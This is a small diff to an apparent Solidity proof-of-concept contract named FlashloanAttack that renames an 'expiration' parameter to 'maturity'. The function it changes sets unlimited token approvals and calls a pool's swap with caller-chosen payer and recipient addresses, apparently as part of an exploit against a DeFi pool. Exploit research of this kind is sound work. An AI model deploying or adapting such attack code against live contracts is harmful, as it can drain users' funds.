@@ -23,14 +23,14 @@ contract FlashloanAttack {
     uint sideOut,
     address helper,
     bytes calldata payload,
-    uint32 expiration,
+    uint32 maturity,
     address payer,
     address recipient
   ) public {
     IERC20(params.tokenIn).approve(ROUTER, type(uint).max);
     IERC1155(deriToken).setApprovalForAll(POOL, true);
     ISwapRouter(ROUTER).exactInputSingle(params);
-    IPool(POOL).swap(sideIn, sideOut, helper, payload, expiration, payer, recipient);
+    IPool(POOL).swap(sideIn, sideOut, helper, payload, maturity, payer, recipient);
   }
 
    function onERC1155Received(
